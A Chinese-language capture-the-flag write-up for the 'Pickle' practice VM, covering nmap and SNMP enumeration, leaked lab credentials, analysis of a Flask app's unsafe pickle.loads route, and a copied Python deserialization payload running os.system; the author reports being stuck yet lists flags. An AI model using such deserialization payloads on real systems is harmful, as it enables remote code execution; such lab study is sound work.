# Pickle

:::note

[Linux VM] [Tested on VirtualBox] created by || 0xEEX75

⏲️ Release Date // 2020-10-22

✔️ MD5 // b686ceacc5e04131dcb895e19f2de9d4

☠ Root // 31

💀 User // 29

📝Notes //
Contact me if you need any help. @OldProgrammer#1257.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.118
```

## nmap 信息搜集

```plaintext title="nmap tcp"
Nmap scan report for 192.168.56.118
Host is up (0.00052s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.56.102
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak
1337/tcp open  http    Werkzeug httpd 1.0.1 (Python 2.7.16)
| http-auth:
| HTTP/1.0 401 UNAUTHORIZED\x0D
|_  Basic realm=Pickle login
|_http-server-header: Werkzeug/1.0.1 Python/2.7.16
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

```plaintext title="nmap udp"
┌─[randark@parrot]─[~]
└──╼ $ sudo nmap -A --min-rate=5000 -T4 -sU --top-ports 20 192.168.56.118
Starting Nmap 7.94SVN (https://nmap.org) at 2024-02-23 09:12 CST
Nmap scan report for 192.168.56.118
Host is up (0.00069s latency).

PORT      STATE         SERVICE      VERSION
161/udp   open          snmp         SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info:
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 8ac2e5721551835f00000000
|   snmpEngineBoots: 26
|_  snmpEngineTime: 2m55s
| snmp-sysdescr: Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64
|_  System uptime: 2m55.16s (17516 timeticks)
```

## ftp 匿名登陆

```shell
ftp> ls -lah
229 Entering Extended Passive Mode (|||33958|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 12  2020 .
drwxr-xr-x    2 0        0            4096 Oct 12  2020 ..
-rwxr-xr-x    1 0        0            1306 Oct 12  2020 init.py.bak
```

下载下来进行分析

```python
from functools import wraps
from flask import *
import hashlib
import socket
import base64
import pickle
import hmac

app = Flask(__name__, template_folder="templates", static_folder="/opt/project/static/")

@app.route('/', methods=["GET", "POST"])
def index_page():
        '''
                __index_page__()
        '''
        if request.method == "POST" and request.form["story"] and request.form["submit"]:
                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
                write_page = open(paths_page, "w")
                write_page.write(request.form["story"])

                return "The message was sent successfully!"

        return render_template("index.html")

@app.route('/reset', methods=["GET", "POST"])
def reset_page():
        '''
                __reset_page__()
        '''
        pass


@app.route('/checklist', methods=["GET", "POST"])
def check_page():
        '''
                __check_page__()
        '''
        if request.method == "POST" and request.form["check"]:
                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
                open_page    = open(path_page, "rb").read()
                if "p1" in open_page:
                        open_page = pickle.loads(open_page)
                        return str(open_page)
                else:
                        return open_page
        else:
                return "Server Error!"

        return render_template("checklist.html")

if __name__ == '__main__':
        app.run(host='0.0.0.0', port=1337, debug=True)
```

## snmp 服务探测

```shell
┌─[randark@parrot]─[~/tmp]
└──╼ $ snmpwalk -c public -v 1 192.168.56.118 | head -n 15
iso.3.6.1.2.1.1.1.0 = STRING: "Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (2074634) 5:45:46.34
iso.3.6.1.2.1.1.4.0 = STRING: "lucas:SuperSecretPassword123!"
iso.3.6.1.2.1.1.5.0 = STRING: "pickle"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4
```

在其中得到一组凭据

```plaintext
lucas:SuperSecretPassword123!
```

使用这组凭据即可成功登录 `http://192.168.56.118:1337/`

## Python 服务源码分析

根据拿到的源码，我们可以得知，服务总共有三个路由

```plaintext
/
/reset
/checklist
```

### 根路由

对 `/` 路由部分进行分析

```python
@app.route('/', methods=["GET", "POST"])
def index_page():
        '''
                __index_page__()
        '''
        if request.method == "POST" and request.form["story"] and request.form["submit"]:
                md5_encode = hashlib.md5(request.form["story"]).hexdigest()
                paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
                write_page = open(paths_page, "w")
                write_page.write(request.form["story"])

                return "The message was sent successfully!"

        return render_template("index.html")
```

首先，服务会检查 POST 过去的数据中是否有 `story` 和 `submit` 两个变量

```python
if request.method == "POST" and request.form["story"] and request.form["submit"]
```

然后对发送的 `story` 变量计算哈希，并创建日志文件，写入 `story` 变量中的数据

```python
md5_encode = hashlib.md5(request.form["story"]).hexdigest()
paths_page  = "/opt/project/uploads/%s.log" %(md5_encode)
write_page = open(paths_page, "w")
write_page.write(request.form["story"])
```

### `/checklist` 路由

```python
@app.route('/checklist', methods=["GET", "POST"])
def check_page():
        '''
                __check_page__()
        '''
        if request.method == "POST" and request.form["check"]:
                path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
                open_page    = open(path_page, "rb").read()
                if "p1" in open_page:
                        open_page = pickle.loads(open_page)
                        return str(open_page)
                else:
                        return open_page
        else:
                return "Server Error!"

        return render_template("checklist.html")
```

这个路由会将 POST 过去的数据中的 `check` 变量提取出来，组合为文件名并进行读取

```python
if request.method == "POST" and request.form["check"]:
        path_page    = "/opt/project/uploads/%s.log" %(request.form["check"])
        open_page    = open(path_page, "rb").read()
```

这里结合上文的分析，很容易就能发现是读取上文的日志文件

然后接下来进入数据检查部分

```python
if "p1" in open_page
```

如果 `p1` 字段存在于数据中，则进入反序列化阶段

```python
open_page = pickle.loads(open_page)
return str(open_page)
```

### 尝试利用

在网上可以找到这篇 payload

```python
import os
import pickle
import hashlib
import requests

class CommandExecute(object):
    def __reduce__(self):
        return (os.system, ('ping -c 2 192.168.0.17',))

convert_data = pickle.dumps(CommandExecute())
convert_crypt = hashlib.md5(convert_data).hexdigest()
send_requests = requests.post('http://192.168.0.44:1337/', data={"story":convert_data, "submit":"Submit+Query"}, auth=("lucas", "SuperSecretPassword123!"))
check_requests = requests.post('http://192.168.0.44:1337/checklist', data={"check":convert_crypt}, auth=("lucas", "SuperSecretPassword123!"))
print(check_requests.text)
```

但是实际上由于传输过程中的编码缘故，最终计算出来的哈希不应该由 `hashlib.md5(pickle.dumps(CommandExecute())).hexdigest()` 来计算，建议开一个 Burp Suite 抓包进行计算

:::warning

这里会遇到远程服务接受的数据与本地发送的数据不一致的问题，挺神奇，即使我直接本地用相同的代码起了一个相同的服务端，都没找到问题在哪里

按理来说，http 发送前会经历一遍 url encode 之后，在服务端再执行 url decode 一遍，但是不清楚哪里出现问题

严重卡壳

:::

## Failed

死题了，入口点都进不去，就是找不到具体的入口点哈希计算哪里出现问题

### flag - user

```plaintext
e25fd1b9248d1786551e3412adc74f6f
```

### flag - root

```plaintext
7a32c9739cc63ed983ae01af2577c01c
```
